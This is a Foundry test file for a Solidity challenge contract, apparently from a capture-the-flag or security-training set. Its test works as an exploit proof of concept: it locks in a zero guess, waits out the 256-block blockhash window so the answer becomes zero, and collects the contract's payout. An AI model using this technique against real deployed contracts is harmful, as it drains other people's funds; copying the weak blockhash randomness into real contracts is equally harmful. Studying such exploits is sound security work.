
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public target;

    function setUp() public {
        target = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure blockNumber is valid and allows for future rolling without overflow
        vm.assume(blockNumber > 0 && blockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        vm.deal(address(this), 1 ether);

        // Set the initial block number
        vm.roll(blockNumber);

        // We exploit the fact that blockhash returns 0 for blocks older than 256 blocks.
        // We lock in a guess of 0.
        bytes32 predictedHash = bytes32(0);
        target.lockInGuess{value: 1 ether}(predictedHash);

        // The contract sets the target block to block.number + 1
        uint256 targetBlock = blockNumber + 1;

        // Advance the block number so that targetBlock is more than 256 blocks in the past.
        // EVM Rule: blockhash(N) == 0 if block.number > N + 256.
        uint256 futureBlock = targetBlock + 257;
        vm.roll(futureBlock);

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally inside the test.
        // At this block height, the blockhash of targetBlock should be 0.
        bytes32 replicatedAnswer = blockhash(targetBlock);
                
        // Execute
        uint256 preBalance = address(this).balance;
        target.settle();
        uint256 postBalance = address(this).balance;

        // Assert Predictability
        assertEq(replicatedAnswer, bytes32(0), "Replicated blockhash should be 0 due to age");
        assertEq(predictedHash, replicatedAnswer, "Predicted hash should match the replicated answer");
        assertEq(postBalance, preBalance + 2 ether, "Attack failed: Payout not received");
    }

    receive() external payable {}

    fallback() external payable {}
}
